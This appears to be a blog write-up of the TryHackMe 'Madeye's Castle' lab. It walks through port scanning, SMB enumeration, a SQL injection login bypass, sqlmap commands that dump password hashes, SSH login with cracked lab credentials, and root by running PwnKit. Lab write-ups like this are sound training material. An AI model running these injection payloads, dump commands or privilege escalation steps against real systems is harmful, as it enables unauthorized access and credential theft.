---
layout: post
title: Madeye's castle - TryHackMe write-up
---

Write-up for Madeye's Castle TryHackMe CTF

Hi hackers, today I’m gonna write-up Madeye's castle, a medium TryHackMe CTF.

![](https://tryhackme-images.s3.amazonaws.com/room-icons/ca10be057f31be4048d374946a602785.jpeg)

## User
Fist, I did port scanning with rustscan and nmap
```
$ rustscan -a madeye.thm -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/ubuntu/.rustscan.toml" 
Open 10.10.220.41:22
Open 10.10.220.41:80
Open 10.10.220.41:139
Open 10.10.220.41:445
$ nmap -p22,80,139,445 -A -T4 -oN port.txt madeye.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2022-06-04 18:35 CEST
Nmap scan report for madeye.thm (10.10.220.41)
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: HOGWARTZ-CASTLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: hogwartz-castle
|   NetBIOS computer name: HOGWARTZ-CASTLE\x00
|   Domain name: \x00
|   FQDN: hogwartz-castle
|_  System time: 2022-06-04T16:35:58+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-06-04T16:35:58
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.84 seconds
```
We had three services: SSH (22), HTTP(80) and SMB(139, 445), so I started testing SMB.
Fisrt I enumerated available share
```
$ smbclient -L \\\\madeye.thm\\
Enter WORKGROUP\ubuntu's password: 

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	sambashare      Disk      Harry's Important Files
	IPC$            IPC       IPC Service (hogwartz-castle server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
I noticed sambashare so I connected and downloaded all files contained:
```
$ smbclient -N \\\\madeye.thm\\sambashare\\
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 02:19:20 2020
  ..                                  D        0  Thu Nov 26 01:57:55 2020
  spellnames.txt                      N      874  Thu Nov 26 02:06:32 2020
  .notes.txt                          H      147  Thu Nov 26 02:19:19 2020

		9219412 blocks of size 1024. 4411804 blocks available
```
File spellnames.txt contained a wordlist whereas .notes.txt contained the following:
```
Hagrid told me that spells names are not good since they will not "rock you"
Hermonine loves historical text editors along with reading old books.
```
After that I started enumerating HTTP, who was hosting apache default page

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_madeyescastle/apachedefaultpage.png)

But I found something interesting by looking at source code:

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_madeyescastle/sourcecode.png)

There's a vhost hogwartz-castle.thm so I added it into /etc/hosts and started testing

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_madeyescastle/hogwartz.png)

It was hosting a login page, so I tested SQL injection, LDAP injection, XPATH injection and so on; It was vulnerable to SQL injection

`user=x ' or 1=1-- -&password=x`

And it redirect me to a json

`{"error":"The password for Lucas Washington is incorrect! contact administrator. Congrats on SQL injection... keep digging"}`

So I enumerated tables with SQLmap and it found one table
```
$ sqlmap -u "http://hogwartz-castle.thm/login" --data="user=x&password=x" -p user --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.9#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:59:56 /2022-06-04/

[18:59:56] [INFO] resuming back-end DBMS 'sqlite' 
[18:59:56] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: user=-5956' OR 9310=9310-- XEXb&password=x
---
[18:59:56] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: SQLite
[18:59:56] [INFO] fetching tables for database: 'SQLite_masterdb'
[18:59:56] [INFO] fetching number of tables for database 'SQLite_masterdb'
[18:59:57] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[18:59:57] [INFO] retrieved: 
[1 table]
+-------+
| users |
+-------+
```
After that I dumped table users
```
$ sqlmap -u "http://hogwartz-castle.thm/login" --data="user=x&password=x" -p user -T users --dump
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.9#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:02:19 /2022-06-04/

[19:02:19] [INFO] resuming back-end DBMS 'sqlite' 
[19:02:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: user=-5956' OR 9310=9310-- XEXb&password=x
---
[19:02:19] [INFO] the back-end DBMS is SQLite
web server operating system: Linux Ubuntu 18.04 (bionic)
web application technology: Apache 2.4.29
back-end DBMS: SQLite
[19:02:19] [INFO] resumed: CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not dddd)
[19:02:19] [INFO] fetching entries for table 'users'
[19:02:19] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
[19:02:19] [INFO] resumed: 40
[19:02:19] [INFO] resumed: 0
[19:02:19] [INFO] resumed: Lucas Washington
[19:02:19] [INFO] resumed: contact administrator. Congrats on SQL injection... keep digging
[19:02:19] [INFO] resumed: c53d7af1bbe101a6b45a3844c89c8c06d8ac24ed562f01b848cad9925c691e6f10217b6594532b9cd31aa5762d85df642530152d9adb3005fac407e2896bf492
[19:02:19] [INFO] resumed: 0
[19:02:19] [INFO] resumed: Harry Turner
[19:02:19] [INFO] resumed: My linux username is my first name, and password uses best64
[19:02:19] [INFO] resumed: b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885
[19:02:19] [INFO] resumed: 0
[19:02:19] [INFO] resumed: Andrea Phillips
[19:02:19] [INFO] resumed:  contact administrator. Congrats on SQL injection... keep digging
[19:02:19] [INFO] resumed: e1ed732e4aa925f0bf125ae8ed17dd2d5a1487f9ff97df63523aa481072b0b5ab7e85713c07e37d9f0c6f8b1840390fc713a4350943e7409a8541f15466d8b54
[19:02:19] [INFO] resumed: 0
[19:02:19] [INFO] resumed: Liam Hernandez
[19:02:19] [INFO] resumed: contact administrator. Congrats on SQL injection... keep digging
[19:02:19] [INFO] resumed: 5628255048e956c9659ed4577ad15b4be4177ce9146e2a51bd6e1983ac3d5c0e451a0372407c1c7f70402c3357fc9509c24f44206987b1a31d43124f09641a8d
[19:02:19] [INFO] resumed: 0
[19:02:19] [INFO] resumed: Adam Jenkins
[19:02:19] [INFO] resumed: contact administrator. Congrats on SQL injection... keep digging
[19:02:19] [INFO] resumed: 2317e58537e9001429caf47366532d63e4e37ecd363392a80e187771929e302922c4f9d369eda97ab7e798527f7626032c3f0c3fd19e0070168ac2a82c953f7b
[19:02:19] [INFO] resumed: 0
```
I noticed the comment of the user Harry Turner so I cracked his hash using [this](https://www.dcode.fr/sha512-hash) web tool

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_madeyescastle/cracked.png)

So I logged into SSH using credentials harry:wingardiumleviosa123
```
$ ssh harry@madeye.thm
Warning: Permanently added the ECDSA host key for IP address '10.10.220.41' to the list of known hosts.
harry@madeye.thm's password: 
 _      __    __                     __         __ __                          __
 | | /| / /__ / /______  __ _  ___   / /____    / // /__  ___ __    _____ _____/ /____
 | |/ |/ / -_) / __/ _ \/  ' \/ -_) / __/ _ \  / _  / _ \/ _ `/ |/|/ / _ `/ __/ __/_ /
 |__/|__/\__/_/\__/\___/_/_/_/\__/  \__/\___/ /_//_/\___/\_, /|__,__/\_,_/_/  \__//__/
                                                        /___/

Last login: Thu Nov 26 01:42:18 2020
harry@hogwartz-castle:~$ 
```
We got user!

## Root
When shell was obtained I needed to get root so I started enumerating OS and found something into Linux version
```
$ uname -a
Linux hogwartz-castle 4.15.0-124-generic #127-Ubuntu SMP Fri Nov 6 10:54:43 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```
It's running a vulnerable kernel so I uploaded PwnKit into the machine and run it

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_madeyescastle/root.png)

It worked, we got root!
See you at the next post, keep hacking
